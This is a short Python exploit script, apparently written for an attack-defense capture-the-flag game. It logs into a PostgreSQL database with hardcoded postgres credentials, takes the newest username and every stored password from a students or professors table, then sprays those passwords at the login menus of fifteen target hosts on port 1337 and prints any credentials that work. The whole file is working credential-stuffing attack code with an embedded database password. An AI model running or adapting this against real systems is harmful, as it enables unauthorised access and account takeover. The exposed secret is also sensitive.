#!/usr/bin/env python3
"""
Take the last login from DB, then try all stored passwords from the same table against multiple hosts.
"""

import socket
from typing import Iterable

import psycopg

# --- CONFIG ---
DB_HOST = "51.250.11.17"
DB_PORT = 5432
DB_USER = "postgres"
DB_PASS = "cowwithballs"
DB_NAME = "arasaka_academy"
DB_TABLE = "students"  # "students" or "professors"

TARGETS = [(f"10.80.{i}.2", 1337) for i in range(1, 16)]

CONNECT_TIMEOUT = 5
# ---------------


def fetch_last_username_and_passwords():
    with psycopg.connect(
        host=DB_HOST,
        port=DB_PORT,
        user=DB_USER,
        password=DB_PASS,
        dbname=DB_NAME,
    ) as conn:
        with conn.cursor() as cur:
            cur.execute(f"SELECT name FROM {DB_TABLE} ORDER BY id DESC LIMIT 1;")
            row = cur.fetchone()
            username = row[0] if row else ""
            cur.execute(f"SELECT pass FROM {DB_TABLE} ORDER BY id ASC;")
            passwords = [r[0] for r in cur.fetchall()]
            return username, passwords


def recv_until(
    sock: socket.socket, marker: bytes, timeout: float = CONNECT_TIMEOUT
) -> bytes:
    sock.settimeout(timeout)
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def try_login(
    target: tuple[str, int], username: str, password: str, as_prof: bool
) -> tuple[bool, bytes, tuple[str, int]]:
    host, port = target
    s = socket.create_connection((host, port), timeout=CONNECT_TIMEOUT)
    recv_until(s, b"Choose:")
    s.sendall(b"1\n")  # Login
    recv_until(s, b"Login as:")
    s.sendall(b"2\n" if as_prof else b"1\n")
    recv_until(s, b"Enter username:")
    s.sendall((username + "\n").encode())
    recv_until(s, b"Enter password:")
    s.sendall((password + "\n").encode())
    banner = recv_until(s, b"Choose:", timeout=3)
    s.close()
    ok = b"Student" in banner or b"Professor" in banner or b"Get info" in banner
    return ok, banner, target


def main():
    username, passwords = fetch_last_username_and_passwords()
    if not username:
        print("[!] No accounts found")
        return
    print(f"[+] Last username: {username}, passwords to try: {len(passwords)}")
    as_prof = DB_TABLE == "professors"

    for pwd in passwords:
        print(f"[.] Trying password {pwd}")
        for host, port in TARGETS:
            try:
                ok, banner, tgt = try_login((host, port), username, pwd, as_prof)
            except Exception as e:
                print(f"[!] {host}:{port} error: {e}")
                continue
            if ok:
                print(f"[OK] host={tgt[0]}:{tgt[1]} user={username} pass={pwd}")
                for line in banner.decode(errors="ignore").splitlines()[:5]:
                    print("  ", line)
                return
    print("[!] No success with stored passwords")


if __name__ == "__main__":
    main()
